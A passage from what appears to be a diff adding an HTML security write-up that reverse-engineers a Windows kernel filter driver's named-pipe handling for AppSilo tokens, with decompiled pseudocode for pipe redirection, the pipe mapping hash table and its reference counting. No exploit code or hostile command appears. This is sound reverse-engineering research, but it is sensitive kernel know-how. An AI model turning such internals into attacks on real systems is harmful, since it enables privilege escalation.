+<span id="cb8-40"><a href="#cb8-40" aria-hidden="true" tabindex="-1"></a>  <span class="cf">else</span></span>
+<span id="cb8-41"><a href="#cb8-41" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb8-42"><a href="#cb8-42" aria-hidden="true" tabindex="-1"></a>  <span class="co">// #4 Setting completion context from extra parameters</span></span>
+<span id="cb8-43"><a href="#cb8-43" aria-hidden="true" tabindex="-1"></a>  GetEcpStatus <span class="op">=</span> FltGetEcpListFromCallbackData<span class="op">(</span>FltRelatedObj<span class="op">-&gt;</span>Filter<span class="op">,</span> CallbackData<span class="op">,</span> <span class="op">&amp;</span>EcpList<span class="op">);</span></span>
+<span id="cb8-44"><a href="#cb8-44" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> GetEcpStatus <span class="op">&gt;=</span> <span class="dv">0</span> <span class="op">)</span></span>
+<span id="cb8-45"><a href="#cb8-45" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb8-46"><a href="#cb8-46" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span> <span class="op">!</span>EcpList <span class="op">)</span></span>
+<span id="cb8-47"><a href="#cb8-47" aria-hidden="true" tabindex="-1"></a>      <span class="cf">goto</span> LABEL_6<span class="op">;</span></span>
+<span id="cb8-48"><a href="#cb8-48" aria-hidden="true" tabindex="-1"></a>    Filter <span class="op">=</span> FltRelatedObj<span class="op">-&gt;</span>Filter<span class="op">;</span></span>
+<span id="cb8-49"><a href="#cb8-49" aria-hidden="true" tabindex="-1"></a>        <span class="co">// get / check extra parameter info</span></span>
+<span id="cb8-50"><a href="#cb8-50" aria-hidden="true" tabindex="-1"></a>        <span class="co">// ... snip ...</span></span>
+<span id="cb8-51"><a href="#cb8-51" aria-hidden="true" tabindex="-1"></a>        v6 <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb8-52"><a href="#cb8-52" aria-hidden="true" tabindex="-1"></a>        <span class="op">*</span>CompletionContext <span class="op">=</span> <span class="op">*(</span>EcpContext <span class="op">+</span> <span class="dv">1</span><span class="op">);</span></span>
+<span id="cb8-53"><a href="#cb8-53" aria-hidden="true" tabindex="-1"></a>      <span class="op">}</span></span>
+<span id="cb8-54"><a href="#cb8-54" aria-hidden="true" tabindex="-1"></a>      <span class="cf">goto</span> LABEL_6<span class="op">;</span></span>
+<span id="cb8-55"><a href="#cb8-55" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb8-56"><a href="#cb8-56" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ... snip ...</span></span>
+<span id="cb8-57"><a href="#cb8-57" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb8-58"><a href="#cb8-58" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> LoggingLevel <span class="op">&lt;=</span> <span class="dv">3</span> <span class="op">)</span></span>
+<span id="cb8-59"><a href="#cb8-59" aria-hidden="true" tabindex="-1"></a>    <span class="cf">goto</span> LABEL_6<span class="op">;</span></span>
+<span id="cb8-60"><a href="#cb8-60" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb8-61"><a href="#cb8-61" aria-hidden="true" tabindex="-1"></a>  v24 <span class="op">=</span> GetEcpStatus<span class="op">;</span></span>
+<span id="cb8-62"><a href="#cb8-62" aria-hidden="true" tabindex="-1"></a>  v38 <span class="op">=</span> <span class="dv">4</span><span class="bu">LL</span><span class="op">;</span></span>
+<span id="cb8-63"><a href="#cb8-63" aria-hidden="true" tabindex="-1"></a>  v37 <span class="op">=</span> <span class="op">&amp;</span>v24<span class="op">;</span></span>
+<span id="cb8-64"><a href="#cb8-64" aria-hidden="true" tabindex="-1"></a>  EtwWriteTransfer<span class="op">(</span>v17<span class="op">,</span> <span class="op">&amp;</span>unk_1C0013C91<span class="op">,</span> v18<span class="op">,</span> v19<span class="op">,</span> v23<span class="op">,</span> <span class="op">&amp;</span>v36<span class="op">);</span></span>
+<span id="cb8-65"><a href="#cb8-65" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb8-66"><a href="#cb8-66" aria-hidden="true" tabindex="-1"></a>  LABEL_6<span class="op">:</span></span>
+<span id="cb8-67"><a href="#cb8-67" aria-hidden="true" tabindex="-1"></a>  <span class="co">// cleanup memory</span></span>
+<span id="cb8-68"><a href="#cb8-68" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> v6<span class="op">;</span></span>
+<span id="cb8-69"><a href="#cb8-69" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p><strong><code>BfsPreCreatePipeOperation</code> Pseudocode</strong></p>
+<p><code>BfsPreCreatePipeOperation</code> first obtains a pointer to the thread’s <code>ACCESS_TOKEN</code> and calls <code>BfsIsApplicableToken</code> (<code>#1</code>) to validate the token is part of an <code>AppSilo</code> using <code>SeQueryInformationToken</code>. The pseudocode for <code>BfsIsApplicableToken</code> can be seen below:</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="dt">bool</span> __fastcall BfsIsApplicableToken<span class="op">(</span>PACCESS_TOKEN Token<span class="op">)</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="op">...</span> snip <span class="op">...</span></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a>  dwTokenIsAppSilo <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a>  <span class="co">// 0x30 TokenIsAppSilo</span></span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a>  status <span class="op">=</span> SeQueryInformationToken<span class="op">(</span>Token<span class="op">,</span> <span class="bn">0x30</span><span class="bu">u</span><span class="op">,</span> <span class="op">&amp;</span>dwTokenIsAppSilo<span class="op">);</span></span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> status <span class="op">&gt;=</span> <span class="dv">0</span> <span class="op">)</span></span>
+<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> dwTokenIsAppSilo <span class="op">!=</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> LoggingLevel <span class="op">&gt;</span> <span class="dv">3</span> <span class="op">)</span></span>
+<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb9-13"><a href="#cb9-13" aria-hidden="true" tabindex="-1"></a>    <span class="op">...</span> snip <span class="op">...</span></span>
+<span id="cb9-14"><a href="#cb9-14" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb9-15"><a href="#cb9-15" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb9-16"><a href="#cb9-16" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p><strong><code>BfsIsApplicableToken</code> Pseudocode</strong></p>
+<p><code>BfsPreCreatePipeOperation</code> then requests the file information from the callback using <code>FltGetFileNameInformation</code>. The volume information is then stripped from the file using <code>BfsGetFileName</code> and calls <code>BfsIsPrefixRequired</code> (<code>#2</code>) to check if the file name does not begins with <code>Sessions\</code> or <code>LOCAL\</code>. If the check fails (the file path starts with the prefix), the callback Extra Create Parameter (<code>ECP</code>) list is parsed and a completion context is set and the function returns (<code>#4</code>). Otherwise the function will call <code>BfsRedirectNamedPipe</code> and then return. <code>BfsRedirectNamedPipe</code> is responsible:</p>
+<ul>
+<li>modifying callback data and setting new data</li>
+<li>inserting the string <code>\LOCAL\</code> between the pipe name and
+the volume path</li>
+<li>creating <code>ECP</code> list (utilizing, <code>FileName</code>,
+<code>UserSID</code>, <code>AppContainerSid</code>)</li>
+</ul>
+<p>The <code>BfsPostCreatePipeOperation</code> operation is responsible for inserting a <code>PipeEntry</code> object in the pipe table and creating a stream handle context, the pseudo code for <code>BfsPostCreatePipeOperation</code> can be seen below:</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a>__int64 __fastcall BfsPostCreatePipeOperation<span class="op">(</span> <span class="op">...</span>params <span class="op">...</span> <span class="op">)</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>  <span class="co">// ... snip ...</span></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a>  <span class="co">// stack setup</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a>  status <span class="op">=</span> cbData<span class="op">-&gt;</span>IoStatus<span class="op">.</span>Status<span class="op">;</span></span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a>  LOBYTE<span class="op">(</span>InsertedNewEntry<span class="op">)</span> <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a>  </span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a>  <span class="co">// #1 Checks if named pipe was created</span></span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> status <span class="op">&gt;=</span> <span class="dv">0</span> <span class="op">)</span></span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a>    <span class="co">// #2 Checks Completion Context</span></span>
+<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span> <span class="op">!</span>CompletionContext <span class="op">)</span> <span class="cf">return</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">;</span></span>
+<span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a>    v4 <span class="op">=</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb10-14"><a href="#cb10-14" aria-hidden="true" tabindex="-1"></a>    <span class="co">// #3 Inset Named Pipe in Table</span></span>
+<span id="cb10-15"><a href="#cb10-15" aria-hidden="true" tabindex="-1"></a>    statusbak <span class="op">=</span> BfsInsertNamedPipeMapping<span class="op">(</span></span>
+<span id="cb10-16"><a href="#cb10-16" aria-hidden="true" tabindex="-1"></a>                <span class="op">&amp;</span>gBfsPipeMappingTable<span class="op">,</span></span>
+<span id="cb10-17"><a href="#cb10-17" aria-hidden="true" tabindex="-1"></a>                <span class="op">*</span>CompletionContext<span class="op">,</span></span>
+<span id="cb10-18"><a href="#cb10-18" aria-hidden="true" tabindex="-1"></a>                <span class="op">*(</span>CompletionContext <span class="op">+</span> <span class="dv">8</span><span class="op">),</span></span>
+<span id="cb10-19"><a href="#cb10-19" aria-hidden="true" tabindex="-1"></a>                <span class="op">(</span>CompletionContext <span class="op">+</span> <span class="dv">16</span><span class="op">),</span></span>
+<span id="cb10-20"><a href="#cb10-20" aria-hidden="true" tabindex="-1"></a>                <span class="op">(</span>CompletionContext <span class="op">+</span> <span class="dv">32</span><span class="op">),</span></span>
+<span id="cb10-21"><a href="#cb10-21" aria-hidden="true" tabindex="-1"></a>                <span class="op">&amp;</span>InsertedNewEntry<span class="op">,</span></span>
+<span id="cb10-22"><a href="#cb10-22" aria-hidden="true" tabindex="-1"></a>                <span class="op">&amp;</span>PipeEntry<span class="op">);</span></span>
+<span id="cb10-23"><a href="#cb10-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-24"><a href="#cb10-24" aria-hidden="true" tabindex="-1"></a>    status <span class="op">=</span> statusbak<span class="op">;</span></span>
+<span id="cb10-25"><a href="#cb10-25" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span> statusbak <span class="op">&gt;=</span> <span class="dv">0</span> <span class="op">)</span></span>
+<span id="cb10-26"><a href="#cb10-26" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
+<span id="cb10-27"><a href="#cb10-27" aria-hidden="true" tabindex="-1"></a>      <span class="co">// #4 Allocate / Set Stream Handle Context</span></span>
+<span id="cb10-28"><a href="#cb10-28" aria-hidden="true" tabindex="-1"></a>      statusbak <span class="op">=</span> FltAllocateContext<span class="op">(</span>RelatedObject<span class="op">-&gt;</span>Filter<span class="op">,</span> <span class="bn">0x10</span><span class="bu">u</span><span class="op">,</span> <span class="bn">0x10</span><span class="bu">uLL</span><span class="op">,</span> PagedPool<span class="op">,</span> <span class="op">&amp;</span>NewContext<span class="op">);</span></span>
+<span id="cb10-29"><a href="#cb10-29" aria-hidden="true" tabindex="-1"></a>      status <span class="op">=</span> statusbak<span class="op">;</span></span>
+<span id="cb10-30"><a href="#cb10-30" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> <span class="op">(</span> statusbak <span class="op">&gt;=</span> <span class="dv">0</span> <span class="op">)</span></span>
+<span id="cb10-31"><a href="#cb10-31" aria-hidden="true" tabindex="-1"></a>      <span class="op">{</span></span>
+<span id="cb10-32"><a href="#cb10-32" aria-hidden="true" tabindex="-1"></a>        PipeEntryBak <span class="op">=</span> PipeEntry<span class="op">;</span></span>
+<span id="cb10-33"><a href="#cb10-33" aria-hidden="true" tabindex="-1"></a>        NewContext<span class="op">-&gt;</span>field_0 <span class="op">=</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb10-34"><a href="#cb10-34" aria-hidden="true" tabindex="-1"></a>        NewContext<span class="op">-&gt;</span>PipeEntry <span class="op">=</span> PipeEntryBak<span class="op">;</span></span>
+<span id="cb10-35"><a href="#cb10-35" aria-hidden="true" tabindex="-1"></a>        statusbak <span class="op">=</span> FltSetStreamHandleContext<span class="op">(</span></span>
+<span id="cb10-36"><a href="#cb10-36" aria-hidden="true" tabindex="-1"></a>                      RelatedObject<span class="op">-&gt;</span>Instance<span class="op">,</span></span>
+<span id="cb10-37"><a href="#cb10-37" aria-hidden="true" tabindex="-1"></a>                      RelatedObject<span class="op">-&gt;</span>FileObject<span class="op">,</span></span>
+<span id="cb10-38"><a href="#cb10-38" aria-hidden="true" tabindex="-1"></a>                      FLT_SET_CONTEXT_REPLACE_IF_EXISTS<span class="op">,</span></span>
+<span id="cb10-39"><a href="#cb10-39" aria-hidden="true" tabindex="-1"></a>                      NewContext<span class="op">,</span></span>
+<span id="cb10-40"><a href="#cb10-40" aria-hidden="true" tabindex="-1"></a>                      <span class="op">&amp;</span>OldContext<span class="op">);</span></span>
+<span id="cb10-41"><a href="#cb10-41" aria-hidden="true" tabindex="-1"></a>        <span class="co">// ... snip ...</span></span>
+<span id="cb10-42"><a href="#cb10-42" aria-hidden="true" tabindex="-1"></a>      <span class="op">}</span></span>
+<span id="cb10-43"><a href="#cb10-43" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb10-44"><a href="#cb10-44" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ... snip ...</span></span>
+<span id="cb10-45"><a href="#cb10-45" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb10-46"><a href="#cb10-46" aria-hidden="true" tabindex="-1"></a>  <span class="co">// ... snip ...</span></span>
+<span id="cb10-47"><a href="#cb10-47" aria-hidden="true" tabindex="-1"></a>  LABEL_13<span class="op">:</span></span>
+<span id="cb10-48"><a href="#cb10-48" aria-hidden="true" tabindex="-1"></a>  <span class="co">// #5 Clean up Completion Context</span></span>
+<span id="cb10-49"><a href="#cb10-49" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> CompletionContext <span class="op">)</span></span>
+<span id="cb10-50"><a href="#cb10-50" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb10-51"><a href="#cb10-51" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span> <span class="op">!</span>InsertedNewEntry <span class="op">)</span></span>
+<span id="cb10-52"><a href="#cb10-52" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
+<span id="cb10-53"><a href="#cb10-53" aria-hidden="true" tabindex="-1"></a>      <span class="co">// ... snip ...</span></span>
+<span id="cb10-54"><a href="#cb10-54" aria-hidden="true" tabindex="-1"></a>      <span class="co">// free context info</span></span>
+<span id="cb10-55"><a href="#cb10-55" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb10-56"><a href="#cb10-56" aria-hidden="true" tabindex="-1"></a>    ExFreePoolWithTag<span class="op">(</span>CompletionContext<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
+<span id="cb10-57"><a href="#cb10-57" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb10-58"><a href="#cb10-58" aria-hidden="true" tabindex="-1"></a>  <span class="co">// #6 Dereference / Cleanup Pipe Entry</span></span>
+<span id="cb10-59"><a href="#cb10-59" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> status <span class="op">&lt;</span> <span class="dv">0</span> <span class="op">)</span></span>
+<span id="cb10-60"><a href="#cb10-60" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb10-61"><a href="#cb10-61" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span> PipeEntry <span class="op">)</span></span>
+<span id="cb10-62"><a href="#cb10-62" aria-hidden="true" tabindex="-1"></a>      BfsReleaseNamedPipeMapping<span class="op">(&amp;</span>gBfsPipeMappingTable<span class="op">,</span> PipeEntry<span class="op">);</span></span>
+<span id="cb10-63"><a href="#cb10-63" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span> v4 <span class="op">)</span></span>
+<span id="cb10-64"><a href="#cb10-64" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
+<span id="cb10-65"><a href="#cb10-65" aria-hidden="true" tabindex="-1"></a>      cbData<span class="op">-&gt;</span>IoStatus<span class="op">.</span>Status <span class="op">=</span> status<span class="op">;</span></span>
+<span id="cb10-66"><a href="#cb10-66" aria-hidden="true" tabindex="-1"></a>      FltSetCallbackDataDirty<span class="op">(</span>cbData<span class="op">);</span></span>
+<span id="cb10-67"><a href="#cb10-67" aria-hidden="true" tabindex="-1"></a>      FltCancelFileOpen<span class="op">(</span>RelatedObject<span class="op">-&gt;</span>Instance<span class="op">,</span> RelatedObject<span class="op">-&gt;</span>FileObject<span class="op">);</span></span>
+<span id="cb10-68"><a href="#cb10-68" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb10-69"><a href="#cb10-69" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb10-70"><a href="#cb10-70" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">;</span></span>
+<span id="cb10-71"><a href="#cb10-71" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p><strong><code>BfsPostCreatePipeOperation</code>
+Pseudocode</strong></p>
+<p><code>BfsPostCreatePipeOperation</code> first confirms that the named pipe creation succeeded (<code>#1</code>) and that a <code>CompletionContext</code> was set (<code>#2</code>). If either fails the function will exit. The function then calls <code>BfsInsertNamedPipeMapping</code> (<code>#3</code>). <code>BfsInsertNamedPipeMapping</code> is responsible for the following:</p>
+<ul>
+<li>derives hash from <code>UserSid</code>, <code>AppContainerSid</code>
+and <code>FilePath</code></li>
+<li>looking up hash in pipe mapping table
+<ul>
+<li>incrementing reference count and returns entry if exists</li>
+<li>allocate new pipe entry if hash is not in table
+<ul>
+<li>inserts new entry in table</li>
+</ul></li>
+</ul></li>
+</ul>
+<p>Pseudocode for <code>BfsInsertNamedPipeMapping</code> can be seen below:</p>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a>__int64 __fastcall BfsInsertNamedPipeMapping<span class="op">(</span> <span class="op">...</span> params <span class="op">...)</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="op">{</span>  </span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>  <span class="co">// Stack setup</span></span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a>  <span class="co">// ... snip  ...</span></span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>  BfsUpdateHash<span class="op">(</span>ProbablyUserSid<span class="op">,</span> <span class="dv">4</span> <span class="op">*</span> ProbablyUserSid<span class="op">[</span><span class="dv">1</span><span class="op">]</span> <span class="op">+</span> <span class="dv">8</span><span class="op">,</span> <span class="op">&amp;</span>v24<span class="op">);</span></span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a>  BfsUpdateHash<span class="op">(</span>PropbablyAppContainerSid<span class="op">,</span> <span class="dv">4</span> <span class="op">*</span> PropbablyAppContainerSid<span class="op">[</span><span class="dv">1</span><span class="op">]</span> <span class="op">+</span> <span class="dv">8</span><span class="op">,</span> <span class="op">&amp;</span>v24<span class="op">);</span></span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a>  BfsUpdateUnicodeStringHash<span class="op">(</span>ProbFilePath<span class="op">,</span> <span class="op">&amp;</span>v24<span class="op">);</span></span>
+<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a>  FinalHash <span class="op">=</span> BfsFinalHash<span class="op">(&amp;</span>v24<span class="op">);</span></span>
+<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a>  v25 <span class="op">=</span> FinalHash<span class="op">;</span></span>
+<span id="cb11-11"><a href="#cb11-11" aria-hidden="true" tabindex="-1"></a>  KeEnterCriticalRegion<span class="op">();</span></span>
+<span id="cb11-12"><a href="#cb11-12" aria-hidden="true" tabindex="-1"></a>  ExAcquirePushLockExclusiveEx<span class="op">(</span>PipeMappingTable<span class="op">,</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">);</span></span>
+<span id="cb11-13"><a href="#cb11-13" aria-hidden="true" tabindex="-1"></a>  <span class="co">// Lookup Pipe Entry Hash</span></span>
+<span id="cb11-14"><a href="#cb11-14" aria-hidden="true" tabindex="-1"></a>  PipeEntryInitial <span class="op">=</span> BfsLookupPipeMappingEntryHashTable<span class="op">(</span></span>
+<span id="cb11-15"><a href="#cb11-15" aria-hidden="true" tabindex="-1"></a>                       PipeMappingTable<span class="op">-&gt;</span>PipeMappingHashTable<span class="op">,</span></span>
+<span id="cb11-16"><a href="#cb11-16" aria-hidden="true" tabindex="-1"></a>                       FinalHash<span class="op">,</span></span>
+<span id="cb11-17"><a href="#cb11-17" aria-hidden="true" tabindex="-1"></a>                       ProbablyUserSid<span class="op">,</span></span>
+<span id="cb11-18"><a href="#cb11-18" aria-hidden="true" tabindex="-1"></a>                       PropbablyAppContainerSid<span class="op">,</span></span>
+<span id="cb11-19"><a href="#cb11-19" aria-hidden="true" tabindex="-1"></a>                       ProbFilePath<span class="op">);</span></span>
+<span id="cb11-20"><a href="#cb11-20" aria-hidden="true" tabindex="-1"></a>  v13 <span class="op">=</span> <span class="op">&amp;</span>PipeEntryInitial<span class="op">-&gt;</span>HashTableEntry<span class="op">;</span></span>
+<span id="cb11-21"><a href="#cb11-21" aria-hidden="true" tabindex="-1"></a>  <span class="co">// If Entry Exists</span></span>
+<span id="cb11-22"><a href="#cb11-22" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> PipeEntryInitial <span class="op">)</span></span>
+<span id="cb11-23"><a href="#cb11-23" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb11-24"><a href="#cb11-24" aria-hidden="true" tabindex="-1"></a>    <span class="co">// increment ref count</span></span>
+<span id="cb11-25"><a href="#cb11-25" aria-hidden="true" tabindex="-1"></a>    <span class="co">// release lock</span></span>
+<span id="cb11-26"><a href="#cb11-26" aria-hidden="true" tabindex="-1"></a>    <span class="co">// return</span></span>
+<span id="cb11-27"><a href="#cb11-27" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb11-28"><a href="#cb11-28" aria-hidden="true" tabindex="-1"></a>  Pool2 <span class="op">=</span> ExAllocatePool2<span class="op">(</span><span class="dv">256</span><span class="bu">LL</span><span class="op">,</span> <span class="bn">0x50</span><span class="bu">LL</span><span class="op">,</span> <span class="dv">1299408450</span><span class="bu">LL</span><span class="op">);</span></span>
+<span id="cb11-29"><a href="#cb11-29" aria-hidden="true" tabindex="-1"></a>  PipeEntryNew <span class="op">=</span> Pool2<span class="op">;</span></span>
+<span id="cb11-30"><a href="#cb11-30" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span> Pool2 <span class="op">)</span></span>
+<span id="cb11-31"><a href="#cb11-31" aria-hidden="true" tabindex="-1"></a>  <span class="op">{</span></span>
+<span id="cb11-32"><a href="#cb11-32" aria-hidden="true" tabindex="-1"></a>    <span class="co">// set pipe entry info</span></span>
+<span id="cb11-33"><a href="#cb11-33" aria-hidden="true" tabindex="-1"></a>    memset<span class="op">(</span>Pool2<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span>PipeEntry<span class="op">));</span></span>
+<span id="cb11-34"><a href="#cb11-34" aria-hidden="true" tabindex="-1"></a>    inserted <span class="op">=</span> BfsInsertEntryHashTable<span class="op">(</span>PipeMappingTable<span class="op">-&gt;</span>PipeMappingHashTable<span class="op">,</span> v21<span class="op">,</span> <span class="op">&amp;</span>PipeEntryNew<span class="op">-&gt;</span>HashTableEntry<span class="op">);</span></span>
+<span id="cb11-35"><a href="#cb11-35" aria-hidden="true" tabindex="-1"></a>    v20 <span class="op">=</span> inserted<span class="op">;</span></span>
+<span id="cb11-36"><a href="#cb11-36" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span> inserted <span class="op">&gt;=</span> <span class="dv">0</span> <span class="op">)</span></span>
+<span id="cb11-37"><a href="#cb11-37" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
+<span id="cb11-38"><a href="#cb11-38" aria-hidden="true" tabindex="-1"></a>      PipeEntryNew<span class="op">-&gt;</span>UnkDword <span class="op">=</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb11-39"><a href="#cb11-39" aria-hidden="true" tabindex="-1"></a>      <span class="op">*</span>a7 <span class="op">=</span> <span class="op">&amp;</span>PipeEntryNew<span class="op">-&gt;</span>HashTableEntry<span class="op">;</span></span>
+<span id="cb11-40"><a href="#cb11-40" aria-hidden="true" tabindex="-1"></a>      <span class="op">*</span>InsertedMaybe <span class="op">=</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb11-41"><a href="#cb11-41" aria-hidden="true" tabindex="-1"></a>      <span class="cf">goto</span> LABEL_11<span class="op">;</span></span>
+<span id="cb11-42"><a href="#cb11-42" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb11-43"><a href="#cb11-43" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ... snip ...</span></span>
+<span id="cb11-44"><a href="#cb11-44" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
+<span id="cb11-45"><a href="#cb11-45" aria-hidden="true" tabindex="-1"></a>  <span class="co">// ... snip ...</span></span>
+<span id="cb11-46"><a href="#cb11-46" aria-hidden="true" tabindex="-1"></a>  LABEL_11<span class="op">:</span></span>
+<span id="cb11-47"><a href="#cb11-47" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ... snip ... cleanup</span></span>
+<span id="cb11-48"><a href="#cb11-48" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p><strong><code>BfsInsertNamedPipeMapping</code> Pseudocode</strong></p>
+<p><code>BfsPostCreatePipeOperation</code> then creates and sets the stream handle context for the named pipe (<code>#4</code>) before cleaning up and returning (<code>#5</code>). </p>
+<h3 id="pipemapping-destruction">PipeMapping Destruction</h3>
+<p>Finally <code>BfsNamedPipeStreamHandleCleanup</code>, the function called when a named pipe steam is closed has very simple logic. It checks the context type, to confirm it is <code>FLT_STREAMHANDLE_CONTEXT</code> and it verifies an unknown <code>DWORD</code> is set to 1:</p>
+<div class="sourceCode" id="cb12"><pre
